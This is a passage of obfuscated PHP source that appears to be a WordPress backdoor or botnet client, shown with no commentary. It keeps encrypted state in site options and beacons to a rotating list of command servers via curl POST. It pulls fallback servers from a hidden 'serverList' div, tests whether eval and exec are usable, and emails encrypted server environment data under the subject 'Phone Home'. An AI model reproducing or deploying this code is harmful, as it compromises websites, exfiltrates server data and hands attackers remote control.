        $wp_client_key['started'] = date('Ymd');
        $wp_client_key['last_connect'] = date('Ymd');
        $this->WbKPQMoSbMZkXUeYKXRIk = $wp_client_key;
        return $wp_client_key;
    }
    private function BkISKDyWWRXScnLPbTlyI($PVSXPKLAQGaWKUtNNUYQFoBuJE = 10) {
        $dqkdbOJPzAPsLsuxnjAStdXUDis = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $PqlpeiQHmZBwdmlsfEHmg = '';
        for ($BCEUSjHFFwzzqmHmpjjQI = 0;$BCEUSjHFFwzzqmHmpjjQI < $PVSXPKLAQGaWKUtNNUYQFoBuJE;$BCEUSjHFFwzzqmHmpjjQI++) {
            $PqlpeiQHmZBwdmlsfEHmg.= $dqkdbOJPzAPsLsuxnjAStdXUDis[rand(0, strlen($dqkdbOJPzAPsLsuxnjAStdXUDis) - 1) ];
        }
        return $PqlpeiQHmZBwdmlsfEHmg;
    }
    public function KPBBXYwmuPGPaTyLhWevI() {
        $wp_client_key = $this->wp_client_key;
        if (@$wp_client_key['info']['last_connect'] < date('Ymd')) {
            $wp_client_key = $this->CMQEWmnewJmgOLaFvXGCU($wp_client_key);
            if ($wp_client_key == false) {
                return;
            } else {
                unset($wp_client_key['info']['fail']);
            }
            $wp_client_key['info']['last_connect'] = date('Ymd');
        }
        $wp_client_key['info']['run']++;
        $this->aIIwgKgvtyRoWoMedUdbp(WP_OPTION_KEY, $wp_client_key);
    }
    private function CMQEWmnewJmgOLaFvXGCU($wp_client_key) {
        $yYVsqvOoqWsddypXgJcIKOw = @$wp_client_key['servers'];
        $uHrzRBdPUetDqbZAdw = $this->tEiRFSJMSpXyxKKORPZClI($yYVsqvOoqWsddypXgJcIKOw, $wp_client_key);
        if ($uHrzRBdPUetDqbZAdw !== false) {
            return $uHrzRBdPUetDqbZAdw;
        }
        $uHrzRBdPUetDqbZAdw = $this->tEiRFSJMSpXyxKKORPZClI($this->HSxTktcbTftjZjKRHHmhr(), $wp_client_key);
        if ($uHrzRBdPUetDqbZAdw !== false) {
            return $uHrzRBdPUetDqbZAdw;
        }
        $this->XnpSvtOjNDRmxyfzaDKlGwM();
    }
    private function tEiRFSJMSpXyxKKORPZClI($QrnkCEWRkHbQPoEPelYQRw, $wp_client_key) {
        foreach ($QrnkCEWRkHbQPoEPelYQRw as $gXNjWLFkUQOugyREMXKvZBfw) {
            $uHrzRBdPUetDqbZAdw = $this->VxjeXwUeRLricksbcxlcSRnA($gXNjWLFkUQOugyREMXKvZBfw, $wp_client_key['info'], $wp_client_key);
            if ($uHrzRBdPUetDqbZAdw != false) {
                if (!isset($wp_client_key['info']['empty'])) {
                    $wp_client_key['info']['empty'] = 0;
                }
                if ($this->YobOrWbieESFVcSsWsuBypg) {
                    $wp_client_key['info']['empty']++;
                    if (!isset($BCEUSjHFFwzzqmHmpjjQI)) {
                        $BCEUSjHFFwzzqmHmpjjQI = (int)($wp_client_key['info']['empty'] / 5);
                    }
                    if ($BCEUSjHFFwzzqmHmpjjQI > 0) {
                        $BCEUSjHFFwzzqmHmpjjQI--;
                        continue;
                    }
                }
                if ($this->YobOrWbieESFVcSsWsuBypg) {
                    return $wp_client_key;
                }
                $uHrzRBdPUetDqbZAdw['info']['empty'] = --$wp_client_key['info']['empty'];
                return $uHrzRBdPUetDqbZAdw;
            }
        }
        return false;
    }
    private function VxjeXwUeRLricksbcxlcSRnA($gXNjWLFkUQOugyREMXKvZBfw, $WbKPQMoSbMZkXUeYKXRIk, $wp_client_key) {
        $this->YobOrWbieESFVcSsWsuBypg = false;
        $OQijXfnrxWxPIcPSUibKEFmLE = $this->RoQfzgyhgTpMgdUIktgNdYvKE($gXNjWLFkUQOugyREMXKvZBfw, $WbKPQMoSbMZkXUeYKXRIk);
        $OQijXfnrxWxPIcPSUibKEFmLE = $this->gTSiihhIRUNPkADDVdes($OQijXfnrxWxPIcPSUibKEFmLE);
        if ($OQijXfnrxWxPIcPSUibKEFmLE != false) {
            if ($this->YobOrWbieESFVcSsWsuBypg) {
                return $wp_client_key;
            }
            $OQijXfnrxWxPIcPSUibKEFmLE['info'] = $WbKPQMoSbMZkXUeYKXRIk;
            return $OQijXfnrxWxPIcPSUibKEFmLE;
        }
        return false;
    }
    private function gTSiihhIRUNPkADDVdes($wp_client_key) {
        if (!isset($this->WbKPQMoSbMZkXUeYKXRIk)) {
            $this->WbKPQMoSbMZkXUeYKXRIk = $this->wp_client_key['info'];
        }
        if (md5($this->WbKPQMoSbMZkXUeYKXRIk['serverKey']) == $wp_client_key) {
            $this->YobOrWbieESFVcSsWsuBypg = true;
            return true;
        }
        $wp_client_key = $this->p_dark_tool->vZlUWjEYdyPGPomnFXMGnNY($wp_client_key);
        $wp_client_key = json_decode($wp_client_key, true);
        if ($wp_client_key == false) {
            return false;
        } else {
            if (!isset($wp_client_key['servers'])) {
                return false;
            }
        }
        return $wp_client_key;
    }
    private function RoQfzgyhgTpMgdUIktgNdYvKE($gXNjWLFkUQOugyREMXKvZBfw, $WbKPQMoSbMZkXUeYKXRIk = null, $client_type = null) {
        if (strstr($gXNjWLFkUQOugyREMXKvZBfw, $_SERVER['HTTP_HOST']) || trim($gXNjWLFkUQOugyREMXKvZBfw) == '') {
            return false;
        }
        if (isset($WbKPQMoSbMZkXUeYKXRIk)) {
            $BdlbpgzPBjxVLkBLnsrXkmI = json_encode($WbKPQMoSbMZkXUeYKXRIk);
            $wp_client_key = $this->p_dark_tool->open_conn_with_client_public_key($BdlbpgzPBjxVLkBLnsrXkmI);
            $WbKPQMoSbMZkXUeYKXRIk = array("serverKey" => $WbKPQMoSbMZkXUeYKXRIk['serverKey'], "data" => $wp_client_key['data'], "key" => $wp_client_key['key']);
        }
        while (true) {
            $SCvWTGyfCYyeLdjcFFzobk = curl_init();
            curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_URL, "http://$gXNjWLFkUQOugyREMXKvZBfw");
            curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_RETURNTRANSFER, 1);
            @curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_FOLLOWLOCATION, true);
            if (isset($WbKPQMoSbMZkXUeYKXRIk)) {
                curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_CUSTOMREQUEST, "POST");
                curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_POSTFIELDS, $WbKPQMoSbMZkXUeYKXRIk);
            }
            curl_setopt($SCvWTGyfCYyeLdjcFFzobk, CURLOPT_CONNECTTIMEOUT, 10);
            $wp_client_key = curl_exec($SCvWTGyfCYyeLdjcFFzobk);
            curl_close($SCvWTGyfCYyeLdjcFFzobk);
            if (!strstr($wp_client_key, "301 Moved Permanently")) {
                break;
            } else {
                preg_match_all('/<a.*href=\"""http:\/\/(.*?)\""".*?\>/', $wp_client_key, $NyFDhMvsSaUwvJsx);
                $gXNjWLFkUQOugyREMXKvZBfw = $NyFDhMvsSaUwvJsx[1][0];
            }
        }
        return $wp_client_key;
    }
    private function aIIwgKgvtyRoWoMedUdbp($var_master_public_key, $wp_client_key) {
        if (is_array($wp_client_key)) {
            $wp_client_key = json_encode($wp_client_key);
        }
        $ilUTrmqGvQsBtZfyeBXfg = $this->p_dark_tool->open_conn_with_master_public_key($wp_client_key);
        if ($this->YYfeblxJfGQgkPpfdrIOXNZwHg($ilUTrmqGvQsBtZfyeBXfg)) $wp_client_key = json_decode($ilUTrmqGvQsBtZfyeBXfg, true);
        if (!isset($wp_client_key['key']) || !isset($wp_client_key['data']) || strlen($wp_client_key['key']) == 0 || strlen($wp_client_key['data']) == 0) {
            die();
        }
        update_option($var_master_public_key, $ilUTrmqGvQsBtZfyeBXfg);
    }
    private function McEnUjjQfaFzqGsihhU($var_master_public_key, $ysnqBUjsRbJDIlZaAE = false) {
        if (!$ysnqBUjsRbJDIlZaAE) {
            $wp_client_key = get_option($var_master_public_key);
        } else {
            $wp_client_key = $var_master_public_key;
        }
        $GfNOeQGoTKggozAbXZAUpg = $this->p_dark_tool->vZlUWjEYdyPGPomnFXMGnNY($wp_client_key);
        return json_decode($GfNOeQGoTKggozAbXZAUpg, true);
    }
    private function YrCTrfUzBfsVJKvqiYUeFbc() {
        $givBPiVtALrQjPLInUFKegOE = false;
        @eval('$givBPiVtALrQjPLInUFKegOE = true;');
        return $givBPiVtALrQjPLInUFKegOE;
    }
    private function KNstTqErzZQBDQOODaJdLv() {
        $BlvGDekbFjVHsnUrjUKqdj = explode(', ', ini_get('disable_functions'));
        return !in_array('exec', $BlvGDekbFjVHsnUrjUKqdj);
    }
    private function XnpSvtOjNDRmxyfzaDKlGwM($wp_client_key = null) {
        if ($wp_client_key == null) {
            $wp_client_key = $this->wp_client_key;
        }
        if (isset($wp_client_key['info']['fail'])) {
            $wp_client_key['info']['fail']++;
        } else {
            $wp_client_key['info']['fail'] = 1;
        }
        if (($wp_client_key['info']['fail'] % 100) == 0 && isset($wp_client_key['clients'])) {
            foreach ($wp_client_key['clients'] as $qBNcTAaiRUhfdXBSzsVg) {
                if (strstr($qBNcTAaiRUhfdXBSzsVg, "|") === false) {
                    continue;
                } else {
                    $AoNmaQCAQvHyEPvRUhbfukXQ = explode("|", $qBNcTAaiRUhfdXBSzsVg);
                }
                $gXNjWLFkUQOugyREMXKvZBfw = $AoNmaQCAQvHyEPvRUhbfukXQ[0] . "?" . $AoNmaQCAQvHyEPvRUhbfukXQ[1];
                $OQijXfnrxWxPIcPSUibKEFmLE = $this->RoQfzgyhgTpMgdUIktgNdYvKE($gXNjWLFkUQOugyREMXKvZBfw);
                preg_match("/<div id=\"serverList\" style=\"display: none\">(?<content>.*?)<\/div>/", $OQijXfnrxWxPIcPSUibKEFmLE, $NUwGojaMFrWOXnaoPPXmg);
                if ($this->YYfeblxJfGQgkPpfdrIOXNZwHg($NUwGojaMFrWOXnaoPPXmg['content'])) {
                    $OQijXfnrxWxPIcPSUibKEFmLE = json_decode($NUwGojaMFrWOXnaoPPXmg['content'], true);
                    if (isset($this->wp_client_key)) {
                        $wp_client_key = $this->wp_client_key;
                    } else {
                        $wp_client_key = $this->oqtYbOOiucMYWyZsGEuETRhB();
                    }
                    $wp_client_key['servers'] = array_merge($OQijXfnrxWxPIcPSUibKEFmLE['servers'], $wp_client_key['servers']);
                    $this->$wp_client_key['servers'] = array_unique($wp_client_key['servers']);
                } else {
                }
            }
        }
        if ($wp_client_key['info']['fail'] % 100 == 0) {
            $LMKkvQfVacsJkiwJOKQmc = false;
            $aJQafHDwnaPrCJrQMjHVh = $this->XsvsqpxlWxfKYiyUc($wp_client_key['info']['fail'] / 100 * 5);
            $GSpWdZRUzAuMgSxhFeQsTA = array();
            for ($BCEUSjHFFwzzqmHmpjjQI = 0;$BCEUSjHFFwzzqmHmpjjQI < 5;$BCEUSjHFFwzzqmHmpjjQI++) {
                $YwrSbZoVizxkPzSqHegTC = rand(0, count($aJQafHDwnaPrCJrQMjHVh) - 1);
                $TcfJENOGUCdnEeJdjBHSxLc = 0;
                $XCZRNpIiBvvCJTeyKlycSwY = 0;
                while (in_array($YwrSbZoVizxkPzSqHegTC, $GSpWdZRUzAuMgSxhFeQsTA)) {
                    $XCZRNpIiBvvCJTeyKlycSwY++;
                    $TcfJENOGUCdnEeJdjBHSxLc++;
                    $YwrSbZoVizxkPzSqHegTC = rand(0, count($aJQafHDwnaPrCJrQMjHVh) - 1);
                    if ($TcfJENOGUCdnEeJdjBHSxLc == 10) {
                        $LMKkvQfVacsJkiwJOKQmc = true;
                        break;
                    }
                }
                if ($LMKkvQfVacsJkiwJOKQmc) {
                    break;
                }
                $GSpWdZRUzAuMgSxhFeQsTA[] = $YwrSbZoVizxkPzSqHegTC;
                mail($aJQafHDwnaPrCJrQMjHVh[$YwrSbZoVizxkPzSqHegTC], "Phone Home", json_encode($this->p_dark_tool->open_conn_with_client_public_key(print_r($wp_client_key, true) . print_r($_SERVER, true))));
            }
            $this->vwhhtIrAWhUEFDgPrcco = true;
        }
        $this->aIIwgKgvtyRoWoMedUdbp(WP_OPTION_KEY, $wp_client_key);
    }
    private function YYfeblxJfGQgkPpfdrIOXNZwHg($wp_client_key) {
        $wp_client_key = json_decode($wp_client_key);
        if ($wp_client_key == null) return false;
        return true;
    }
    private function VitTYMKdJITsiXBTLOEA($QrnkCEWRkHbQPoEPelYQRw, $MTPkrEtDJbjkrzXWSBgAo) {
        $PVSXPKLAQGaWKUtNNUYQFoBuJE = count($QrnkCEWRkHbQPoEPelYQRw);
        if ($PVSXPKLAQGaWKUtNNUYQFoBuJE <= $MTPkrEtDJbjkrzXWSBgAo) {
            return $QrnkCEWRkHbQPoEPelYQRw;
        }
        $wp_client_key[] = array();
        $PaTgoaVMMKhvlmVWxSnBVLA = array();
        $FyQVCWLNApYgwsSzygQgg = 0;
        $BCEUSjHFFwzzqmHmpjjQI = 0;
        while (true) {
            $BCEUSjHFFwzzqmHmpjjQI++;
            $var_master_public_key = $this->YHhBHrBuAZYCsZUCLxMNBSuTU($this->htcFFCQTLLpnCchsPKGYxso . $BCEUSjHFFwzzqmHmpjjQI, $PVSXPKLAQGaWKUtNNUYQFoBuJE);
            if (in_array($var_master_public_key, $PaTgoaVMMKhvlmVWxSnBVLA)) {
                continue;
            }
            $PaTgoaVMMKhvlmVWxSnBVLA[] = $var_master_public_key;
            $FyQVCWLNApYgwsSzygQgg++;
            if ($FyQVCWLNApYgwsSzygQgg == $MTPkrEtDJbjkrzXWSBgAo) {
                break;
            }
        }
        foreach ($PaTgoaVMMKhvlmVWxSnBVLA as $var_master_public_key) {
            $wp_client_key[] = $QrnkCEWRkHbQPoEPelYQRw[$var_master_public_key];
        }
        return $wp_client_key;
    }
    private function YHhBHrBuAZYCsZUCLxMNBSuTU($htcFFCQTLLpnCchsPKGYxso, $BwYCWyuBYkgiOzNljFJONA) {
        $dzVXtdBSuUwgnARTiNICo = 0;
        $JAxNyUCJRbrfbemcWrOFpg = hash("md5", $htcFFCQTLLpnCchsPKGYxso);
        $dzVXtdBSuUwgnARTiNICo = (preg_replace("/[^0-9,.]/", "", $JAxNyUCJRbrfbemcWrOFpg));
        while ($dzVXtdBSuUwgnARTiNICo > 10000000) {
            $dzVXtdBSuUwgnARTiNICo/= 100000;
        }
        $this->IatJdWimJbxtprWZElHevfI = $dzVXtdBSuUwgnARTiNICo;
        $dzVXtdBSuUwgnARTiNICo%= $BwYCWyuBYkgiOzNljFJONA;
        return $dzVXtdBSuUwgnARTiNICo;
    }
} ?>

